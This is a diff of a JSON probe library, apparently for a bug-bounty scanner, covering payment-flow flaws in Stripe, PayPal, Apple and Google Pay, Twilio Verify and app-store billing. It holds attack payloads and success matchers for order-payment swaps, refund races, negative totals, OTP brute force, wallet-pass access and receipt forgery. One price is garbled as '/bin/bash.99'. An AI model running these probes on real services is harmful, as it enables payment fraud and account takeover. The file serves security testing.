@@ -1,6 +1,6 @@
 {
   "category": "payment_flow",
-  "description": "Payment flow abuse — Stripe / Square / PayPal / Adyen / Braintree integrations consistently yield $5k+ bounties. Common classes: payment_intent ID confusion, capture/refund races, webhook secret rotation, 3DS setup_intent reuse, idempotency-key per-customer scope, currency confusion, tax-zero exploits.",
+  "description": "Payment flow abuse \u2014 Stripe / Square / PayPal / Adyen / Braintree integrations consistently yield $5k+ bounties. Common classes: payment_intent ID confusion, capture/refund races, webhook secret rotation, 3DS setup_intent reuse, idempotency-key per-customer scope, currency confusion, tax-zero exploits.",
   "craft_guidance": [
     "1. MAP THE FLOW: identify create_intent -> confirm -> capture -> webhook -> capture_settled. Each step is a race / replay / confusion target.",
     "2. PROCESSOR FINGERPRINT: pi_/seti_/ch_ prefixes = Stripe; PAY-/EC- = PayPal; tok_ = Stripe legacy. Different processors have different idempotency / webhook semantics.",
@@ -16,107 +16,235 @@
   "contexts": {
     "intent_id_cross_account": {
       "description": "Reuse a payment_intent ID created by attacker on a victim's order. Server-side: order.charge = stripe.PaymentIntent.retrieve(client_provided_id). If app trusts the ID without verifying customer/amount/account, attacker pays $1 for a $1000 order.",
-      "tech_match": ["stripe", "payment_intent"],
-      "param_match": ["payment_intent_id", "intent_id", "stripe_intent", "client_secret", "transaction_id", "charge_id"],
+      "tech_match": [
+        "stripe",
+        "payment_intent"
+      ],
+      "param_match": [
+        "payment_intent_id",
+        "intent_id",
+        "stripe_intent",
+        "client_secret",
+        "transaction_id",
+        "charge_id"
+      ],
       "probes": [
         {
           "payload": "{\"order_id\":\"<victim_order>\",\"payment_intent_id\":\"<attacker_intent_pi_xxx>\"}",
           "description": "Attach attacker's $1 payment_intent to victim's $1000 order. If accepted (200 + order_paid), no server-side amount/customer verification.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["paid", "confirmed", "success"]},
-            {"type": "not_word", "words": ["amount_mismatch", "customer_mismatch", "intent_not_owned"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "paid",
+                "confirmed",
+                "success"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "amount_mismatch",
+                "customer_mismatch",
+                "intent_not_owned"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "capture_refund_race": {
       "description": "Capture and refund the SAME intent simultaneously. Some apps credit refund to the user's balance AND complete the order, netting attacker the goods + refunded money.",
-      "tech_match": ["stripe", "payment", "refund"],
+      "tech_match": [
+        "stripe",
+        "payment",
+        "refund"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{\"intent_id\":\"<pi_xxx>\",\"action\":\"refund\"}",
           "description": "Fire concurrent capture + refund (use test_race_condition). If both succeed and balance + order_paid both update, race confirmed.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["refund_id", "credited", "balance_increased"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "refund_id",
+                "credited",
+                "balance_increased"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 65,
-          "variables": {"concurrent_with": "capture"}
+          "variables": {
+            "concurrent_with": "capture"
+          }
         }
       ]
     },
     "webhook_secret_rotation_race": {
       "description": "During Stripe webhook secret rotation, BOTH old and new secrets validate for the rotation window (~24h). Captured webhook + old secret = replayable as legitimate.",
-      "tech_match": ["stripe", "webhook", "stripe-signature"],
+      "tech_match": [
+        "stripe",
+        "webhook",
+        "stripe-signature"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{{captured_webhook_old_signature}}",
           "description": "Replay a captured webhook signed with previous secret. If accepted within rotation window, attacker can manufacture events.",
           "matchers": [
-            {"type": "status", "status": [200, 202]},
-            {"type": "not_word", "words": ["signature_invalid", "rotated"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                202
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "signature_invalid",
+                "rotated"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60,
-          "variables": {"manual_capture": true}
+          "variables": {
+            "manual_capture": true
+          }
         }
       ]
     },
     "setup_intent_reuse_no_3ds": {
       "description": "setup_intent saves a card for future charges WITHOUT 3DS challenge. Attacker who captures victim's setup_intent (via OAuth scope leak or browser-extension exfil) charges victim's card without SCA.",
-      "tech_match": ["stripe", "setup_intent", "3ds"],
-      "param_match": ["setup_intent", "payment_method"],
+      "tech_match": [
+        "stripe",
+        "setup_intent",
+        "3ds"
+      ],
+      "param_match": [
+        "setup_intent",
+        "payment_method"
+      ],
       "probes": [
         {
           "payload": "{\"setup_intent\":\"<seti_victim>\",\"amount\":1000,\"action\":\"charge\"}",
           "description": "Charge using victim's setup_intent. 3DS not required; if 200, attacker bypassed SCA.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["succeeded", "charged"]},
-            {"type": "not_word", "words": ["3d_secure", "authentication_required"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "succeeded",
+                "charged"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "3d_secure",
+                "authentication_required"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "idempotency_key_cross_customer": {
-      "description": "Idempotency-Key MUST be scoped to (account, key, body-hash). Some integrations scope only to (key) — same key with different customer ID = duplicate charge attributed to attacker.",
-      "tech_match": ["stripe", "idempotency"],
+      "description": "Idempotency-Key MUST be scoped to (account, key, body-hash). Some integrations scope only to (key) \u2014 same key with different customer ID = duplicate charge attributed to attacker.",
+      "tech_match": [
+        "stripe",
+        "idempotency"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{\"customer\":\"<attacker_cust>\",\"amount\":1,\"currency\":\"usd\"}",
           "description": "Send same idempotency-key with attacker customer first, then victim customer. If second returns first's response (attacker charged), scoping is broken.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["customer\":\"<attacker"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "customer\":\"<attacker"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
-          "variables": {"extra_headers": {"Idempotency-Key": "swk_test_001"}}
+          "variables": {
+            "extra_headers": {
+              "Idempotency-Key": "swk_test_001"
+            }
+          }
         }
       ]
     },
     "currency_confusion": {
       "description": "Order created in USD; charge created in low-value currency (IDR, VND). Server stores numeric price regardless of currency. 1 unit pays for 1 USD worth of goods.",
-      "tech_match": ["payment", "currency"],
-      "param_match": ["currency", "amount", "price"],
+      "tech_match": [
+        "payment",
+        "currency"
+      ],
+      "param_match": [
+        "currency",
+        "amount",
+        "price"
+      ],
       "probes": [
         {
           "payload": "{\"amount\":1,\"currency\":\"idr\",\"order_id\":\"<victim_usd_order>\"}",
           "description": "Charge IDR amount on a USD order. If accepted and order_paid=true, currency normalization is broken.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["paid", "confirmed"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "paid",
+                "confirmed"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60
@@ -125,25 +253,55 @@
     },
     "tax_shipping_negative": {
       "description": "App validates subtotal range (positive, < $X) but not tax / shipping / discount fields. Negative values flip the total.",
-      "tech_match": ["payment", "checkout"],
-      "param_match": ["tax", "shipping", "discount", "total"],
+      "tech_match": [
+        "payment",
+        "checkout"
+      ],
+      "param_match": [
+        "tax",
+        "shipping",
+        "discount",
+        "total"
+      ],
       "probes": [
         {
           "payload": "{\"subtotal\":100,\"tax\":-99,\"shipping\":0,\"total\":1}",
           "description": "Negative tax. If checkout accepts, total drops to $1 from $100.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["total\":1", "amount\":1"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "total\":1",
+                "amount\":1"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60
         },
         {
           "payload": "{\"subtotal\":100,\"discount\":999}",
-          "description": "Discount exceeds subtotal — negative total. Some apps refund the difference.",
+          "description": "Discount exceeds subtotal \u2014 negative total. Some apps refund the difference.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["balance", "credit"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "balance",
+                "credit"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 55
@@ -152,143 +310,632 @@
     },
     "google_pay_token_replay_order_swap": {
       "description": "Google Pay PaymentMethodToken (signed by Google) is tokenized for a specific cart/order. Bug: backend uses the token but trusts client-provided order_id / amount, allowing attacker to attach a $1 token to a $1000 order. Sample 2024-2026 finding pattern: 'token + order_id submitted separately, server doesn't bind'.",
-      "tech_match": ["google_pay", "gpay", "PaymentMethodData"],
-      "param_match": ["paymentMethodData", "gpay_token", "tokenizationData", "order_id", "amount"],
+      "tech_match": [
+        "google_pay",
+        "gpay",
+        "PaymentMethodData"
+      ],
+      "param_match": [
+        "paymentMethodData",
+        "gpay_token",
+        "tokenizationData",
+        "order_id",
+        "amount"
+      ],
       "probes": [
         {
           "payload": "{\"order_id\":\"<victim_high_order>\",\"payment_method_token\":\"<attacker_cheap_token>\",\"amount\":10000}",
           "description": "Tokenize $1 GPay on attacker order, send token with victim's order_id and inflated amount. If charged $1 but order marked paid for $10000, CRITICAL.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["paid", "confirmed", "success"]},
-            {"type": "not_word", "words": ["amount_mismatch", "token_amount_mismatch", "order_mismatch"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "paid",
+                "confirmed",
+                "success"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "amount_mismatch",
+                "token_amount_mismatch",
+                "order_mismatch"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         },
         {
           "payload": "{\"environment\":\"TEST\",\"paymentMethodData\":{...test token...}}",
-          "description": "TEST-env Google Pay tokens shouldn't process on prod. Send a TEST token to prod /charge — accepted = unlimited free charges.",
+          "description": "TEST-env Google Pay tokens shouldn't process on prod. Send a TEST token to prod /charge \u2014 accepted = unlimited free charges.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["charge_id", "paid"]},
-            {"type": "not_word", "words": ["test_environment", "sandbox_rejected", "production_only"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "charge_id",
+                "paid"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "test_environment",
+                "sandbox_rejected",
+                "production_only"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "apple_pay_token_replay_sandbox_on_prod": {
       "description": "Apple Pay PKPaymentToken contains paymentData encrypted with merchant cert. Bug: backend accepts sandbox certs on prod, OR token replayable across orders, OR strips paymentData.signature without verification. Apple Pay JWS uses merchant identity; if not bound to order, attacker pays $1 for $1000.",
-      "tech_match": ["apple_pay", "PKPaymentToken", "passkit"],
-      "param_match": ["paymentData", "transactionIdentifier", "merchantIdentifier"],
+      "tech_match": [
+        "apple_pay",
+        "PKPaymentToken",
+        "passkit"
+      ],
+      "param_match": [
+        "paymentData",
+        "transactionIdentifier",
+        "merchantIdentifier"
+      ],
       "probes": [
         {
           "payload": "<replay PKPaymentToken.paymentData across two orders>",
           "description": "Capture a successful Apple Pay charge. Replay the same paymentData against a different order_id + amount. Server must verify transactionIdentifier uniqueness AND bind paymentData to charge metadata.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["paid", "captured", "success"]},
-            {"type": "not_word", "words": ["duplicate_transaction", "token_replayed", "transaction_id_used"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "paid",
+                "captured",
+                "success"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "duplicate_transaction",
+                "token_replayed",
+                "transaction_id_used"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         },
         {
           "payload": "<send paymentData WITHOUT the signature field>",
           "description": "Strip paymentData.signature. If backend processes without verifying the Apple-issued JWS signature, attacker can forge paymentData payloads.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["success", "captured", "paid"]},
-            {"type": "not_word", "words": ["signature_required", "invalid_signature", "jws_verification_failed"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "success",
+                "captured",
+                "paid"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "signature_required",
+                "invalid_signature",
+                "jws_verification_failed"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 75,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "apple_google_wallet_pass_tampering": {
-      "description": "Apple Wallet (.pkpass) and Google Wallet passes are signed bundles. Pass-update endpoints serve dynamic data (boarding pass status, loyalty balance, ticket QR). Bug: pass-update endpoint (/v1/passes/<passTypeId>/<serialNumber>) accepts auth-token from any user — attacker reads/modifies victim's pass. Or push-update endpoint accepts cross-account passTypeId.",
-      "tech_match": ["apple_wallet", "passkit", "google_wallet", "pkpass", "loyalty_pass"],
-      "param_match": ["passTypeIdentifier", "serialNumber", "passType", "issuerId", "objectId"],
+      "description": "Apple Wallet (.pkpass) and Google Wallet passes are signed bundles. Pass-update endpoints serve dynamic data (boarding pass status, loyalty balance, ticket QR). Bug: pass-update endpoint (/v1/passes/<passTypeId>/<serialNumber>) accepts auth-token from any user \u2014 attacker reads/modifies victim's pass. Or push-update endpoint accepts cross-account passTypeId.",
+      "tech_match": [
+        "apple_wallet",
+        "passkit",
+        "google_wallet",
+        "pkpass",
+        "loyalty_pass"
+      ],
+      "param_match": [
+        "passTypeIdentifier",
+        "serialNumber",
+        "passType",
+        "issuerId",
+        "objectId"
+      ],
       "probes": [
         {
           "payload": "GET /v1/passes/<victim_passTypeId>/<victim_serialNumber> with attacker auth-token",
           "description": "Read victim's pass content (often contains PII: name, balance, ticket QR, loyalty number). 200 with PII = BOLA on wallet.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["passTypeIdentifier", "serialNumber", "barcode", "balance"]},
-            {"type": "not_word", "words": ["unauthorized", "forbidden", "owner_mismatch"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "passTypeIdentifier",
+                "serialNumber",
+                "barcode",
+                "balance"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unauthorized",
+                "forbidden",
+                "owner_mismatch"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         },
         {
           "payload": "POST /v1/devices/<deviceId>/registrations/<passTypeId>/<serialNumber> attacker_authToken",
           "description": "Register attacker's device to receive victim pass push updates. If accepted without owner verification, attacker gets ticket QR / balance changes in real-time.",
           "matchers": [
-            {"type": "status", "status": [200, 201]},
-            {"type": "not_word", "words": ["unauthorized", "forbidden"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unauthorized",
+                "forbidden"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "twilio_verify_otp_brute": {
-      "description": "Twilio Verify and similar OTP-as-a-service backends. Bug: rate limit configured at the Twilio Verify SERVICE level (5 attempts) but app re-uses the same Verify SID across users — attacker exhausts everyone's quota; OR rate limit is per-IP only (rotate IPs); OR /check endpoint returns differential timing for valid vs invalid OTP. Also: Twilio Verify allows custom-code (developer-supplied) which some devs leave at fixed values for testing.",
-      "tech_match": ["twilio", "verify", "otp", "sms_verify"],
-      "param_match": ["code", "verification_code", "otp", "to", "verificationSid"],
+      "description": "Twilio Verify and similar OTP-as-a-service backends. Bug: rate limit configured at the Twilio Verify SERVICE level (5 attempts) but app re-uses the same Verify SID across users \u2014 attacker exhausts everyone's quota; OR rate limit is per-IP only (rotate IPs); OR /check endpoint returns differential timing for valid vs invalid OTP. Also: Twilio Verify allows custom-code (developer-supplied) which some devs leave at fixed values for testing.",
+      "tech_match": [
+        "twilio",
+        "verify",
+        "otp",
+        "sms_verify"
+      ],
+      "param_match": [
+        "code",
+        "verification_code",
+        "otp",
+        "to",
+        "verificationSid"
+      ],
       "probes": [
         {
           "payload": "<send 1000 sequential 6-digit codes to /verify/check for one phone>",
           "description": "Bombard the OTP-check endpoint with concurrent_requests. Absence of 429 after 100+ attempts = no per-account rate limit (Twilio's own limit may not be enforced or may be too high).",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["approved", "verified", "valid"]},
-            {"type": "not_word", "words": ["rate_limit", "too_many_attempts", "max_attempts"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "approved",
+                "verified",
+                "valid"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "rate_limit",
+                "too_many_attempts",
+                "max_attempts"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 65,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         },
         {
           "payload": "{\"to\":\"+1<victim_phone>\",\"code\":\"123456\",\"custom_code\":\"000000\"}",
           "description": "Twilio Verify supports developer-supplied custom_code. If backend forwards client-supplied custom_code to Twilio, attacker controls the expected OTP value. Test by inspecting params on /verify/start.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["pending", "verification_started"]},
-            {"type": "not_word", "words": ["custom_code_not_allowed"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "pending",
+                "verification_started"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "custom_code_not_allowed"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "stripe_connect_express_account_takeover": {
-      "description": "Stripe Connect Express allows platforms to onboard users with Stripe-hosted account UIs. Bug: platform endpoint that returns Account Link URL doesn't validate caller owns the target account_id — attacker requests link for victim's account_id, gets a one-time URL that lands them in victim's Stripe-hosted dashboard with full payout settings access.",
-      "tech_match": ["stripe_connect", "stripe_express", "account_links"],
-      "param_match": ["account_id", "stripe_account", "account_link"],
+      "description": "Stripe Connect Express allows platforms to onboard users with Stripe-hosted account UIs. Bug: platform endpoint that returns Account Link URL doesn't validate caller owns the target account_id \u2014 attacker requests link for victim's account_id, gets a one-time URL that lands them in victim's Stripe-hosted dashboard with full payout settings access.",
+      "tech_match": [
+        "stripe_connect",
+        "stripe_express",
+        "account_links"
+      ],
+      "param_match": [
+        "account_id",
+        "stripe_account",
+        "account_link"
+      ],
       "probes": [
         {
           "payload": "POST /platform/account_links {\"account_id\":\"<victim_acct_id>\",\"return_url\":\"...\"}",
-          "description": "Request Account Link URL for another platform user's account. Server should bind account_id to caller. 200 with a connect.stripe.com URL containing victim's account → CRITICAL.",
+          "description": "Request Account Link URL for another platform user's account. Server should bind account_id to caller. 200 with a connect.stripe.com URL containing victim's account \u2192 CRITICAL.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "regex", "pattern": "connect\\.stripe\\.com/(setup|express)/"},
-            {"type": "not_word", "words": ["unauthorized", "account_not_owned", "forbidden"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "connect\\.stripe\\.com/(setup|express)/"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unauthorized",
+                "account_not_owned",
+                "forbidden"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "ios_iap_receipt_validation_bypass": {
+      "description": "Apple App Store IAP server-side receipt validation. Backend MUST verify base64 receipt against Apples /verifyReceipt or App Store Server API (latest receipt), check transactionId uniqueness, in_app[].quantity, expires_date, and bundle_id == app bundle. Common bugs: (1) backend accepts client-supplied entitlement JSON without verifying receipt, (2) sandbox receipt accepted on production endpoint (status 21007 ignored), (3) transactionId not unique-checked -> replay across accounts, (4) cancellation_date_ms not honoured -> refunded purchase remains entitled.",
+      "tech_match": [
+        "ios",
+        "apple",
+        "iap",
+        "storekit"
+      ],
+      "param_match": [
+        "receipt",
+        "receiptData",
+        "transactionId",
+        "productId",
+        "purchase"
+      ],
+      "probes": [
+        {
+          "payload": "{\"receipt\":\"\",\"productId\":\"premium.lifetime\"}",
+          "description": "Empty receipt with valid productId. If server grants entitlement without receipt validation, IAP is purely client-trusted.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "premium",
+                "active",
+                "success"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "{\"receipt\":\"<sandbox_receipt_base64>\",\"productId\":\"premium.lifetime\",\"environment\":\"sandbox\"}",
+          "description": "Production endpoint should reject sandbox receipts (Apple status 21007). If accepted, attacker can mint free purchases via TestFlight / sandbox.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "premium",
+                "granted"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "sandbox_receipt_on_production",
+                "21007"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "{\"receipt\":\"<reused_receipt>\",\"transactionId\":\"<seen_txn>\",\"userId\":\"<other_account>\"}",
+          "description": "Replay a known-good receipt under a different userId. Backend must scope (receipt, transactionId) to original_transaction_id == user. If accepted, one paying user shares entitlement across N accounts.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "premium",
+                "granted"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "{\"receipt\":\"<valid_then_refunded>\"}",
+          "description": "Receipt for a purchase that was later refunded. App Store Server Notifications v2 sends REFUND / REVOKE. Backend must check cancellation_date_ms / revocationReason. If entitlement persists, refund abuse is trivial.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "active"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{\"receipt\":\"<receipt_from_other_app>\"}",
+          "description": "Receipt from a different bundle_id. If backend doesn't check receipt.bundle_id == own app, attacker buys a /bin/bash.99 IAP in a cheap app and claims premium in target.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "premium"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "android_play_billing_validation_bypass": {
+      "description": "Google Play Billing -- backend must validate purchaseToken against Google Play Developer API (purchases.products.get / purchases.subscriptions.get) and check purchaseState=0, consumptionState, acknowledgementState, orderId uniqueness. Common bugs: (1) client-supplied SubscriptionPurchase JSON trusted without server fetch, (2) packageName not checked -> cross-app receipt, (3) purchaseToken reused across accounts, (4) acknowledgement deadline (3 days) ignored -> auto-refund races, (5) testing account purchases (orderId like GPA.0000-0000-0000-XXXXX..-0) treated as paid.",
+      "tech_match": [
+        "android",
+        "google",
+        "play",
+        "billing"
+      ],
+      "param_match": [
+        "purchaseToken",
+        "productId",
+        "packageName",
+        "orderId"
+      ],
+      "probes": [
+        {
+          "payload": "{\"purchaseToken\":\"\",\"productId\":\"premium.monthly\",\"packageName\":\"com.target.app\"}",
+          "description": "Empty purchaseToken with valid productId. Server must fetch from Google API -- empty token -> 400 from Google. If server returns entitlement, no validation happens.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "active",
+                "premium"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "{\"purchaseToken\":\"<token>\",\"packageName\":\"com.other.app\"}",
+          "description": "Valid token but wrong packageName. Backend should reject -- Google API returns 404. If accepted, cross-app receipt forgery works.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "granted"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "{\"purchaseToken\":\"<reused>\",\"userId\":\"<different_user>\"}",
+          "description": "Replay purchaseToken under different account. Server must bind (token, obfuscatedAccountId) at first redeem and reject subsequent users.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "active"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "{\"orderId\":\"GPA.0000-0000-0000-12345..0\",\"purchaseToken\":\"x\"}",
+          "description": "Test/license-testing orderId (Google Play test purchases use this pattern in non-production). If production server treats it as paid, attacker uses Play test accounts for free entitlement.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "premium"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "test",
+                "sandbox",
+                "unsupported"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{\"purchaseToken\":\"<token_after_refund>\",\"productId\":\"premium\"}",
+          "description": "Refunded purchase token. Google sends voidedPurchases notification -- backend must revoke. If entitlement persists past refund, refund abuse loop.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "entitled",
+                "active"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60
         }
       ]
     }
